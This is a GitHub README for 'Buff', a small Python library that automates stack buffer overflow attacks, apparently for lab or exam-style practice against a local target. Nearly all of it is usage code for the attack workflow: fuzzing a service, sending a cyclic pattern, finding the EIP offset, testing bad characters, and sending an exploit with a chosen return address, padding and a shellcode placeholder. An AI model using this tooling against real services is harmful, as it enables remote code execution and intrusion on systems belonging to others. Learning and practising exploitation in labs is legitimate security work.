<h1 align="center">What is Buff?</h1>  


<p align="center">
    <img src="https://raw.githubusercontent.com/the-robot/buff/master/images/gigachad.png" | width=200>
</p>

<p align="center">A simple BOF library I wrote under an hour to help me automate with BOF attack.</p>
<p align="center">It comes with fuzzer and a generic method to generate exploit easily.</p>

<br/>

# Usage

## Fuzzer
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337))
runner.fuzz()
```

## Sending Pattern
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337))
runner.sendPattern()
```

## Find Pattern Offset
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337))

BUFFER_SIZE = 1100
offset = buff.generator.findPatternOffset(BUFFER_SIZE, "v1Av")
print(offset)
```

## Sending Bad Characters
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337))

runner.setBufferSize(2400)
runner.setEipOffset(1978)
runner.sendBadChars()

# you can also exclude by
runner.sendBadChars(exclude = ["\x42", "\x43"])

# change default EIP placeholder
runner.sendBadChars(fake_eip = "\x44\x44\x44\x44")
```

## Sending Exploit
```python
import buff

runner = buff.Buff(target = ("127.0.0.1", 1337))

# Set Buffer Size
runner.setBufferSize(2400)

# Set Eip offset
runner.setEipOffset(1978)

# Set return address
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

# Set exploit
exploit = ("\xdb\xde.....")
runner.setExploit(exploit)

# Set padding
runner.setPaddingSize(16)

runner.sendExploit()
```
